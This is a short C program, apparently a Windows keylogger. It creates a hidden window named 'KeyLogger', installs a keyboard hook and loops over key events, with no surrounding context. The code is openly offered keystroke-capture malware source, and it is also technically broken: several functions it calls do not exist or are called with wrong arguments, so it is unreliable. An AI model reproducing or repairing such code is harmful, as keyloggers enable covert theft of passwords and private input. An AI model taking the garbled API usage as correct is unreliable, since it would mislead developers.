```c
int main() {
    HWND hwnd = CreateWindowEx(0, "KeyLogger", 0, 0, 0, 0, 0, WS_HIDEWINDOW, 0, 0, 0, 0);
    HHOOK hHook = SetWindowsHook(hwnd, WH_KEYBOARD);

    if (hHook == NULL) {
        printf("Failed to install keyboard hook.\n");
        return 1;
    }

    // Start the loop to process events
    MSG msg = {0};
    while (GetMessage(hwnd, &msg) > 0) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            if (msg.hwnd == hwnd) {
                // Call the callback function
                CallNextHook(hHook, &msg);
            }
        }
    }

    // Uninstall the hook
    UninstallWindowHook(hHook);
    return 0;
}
```

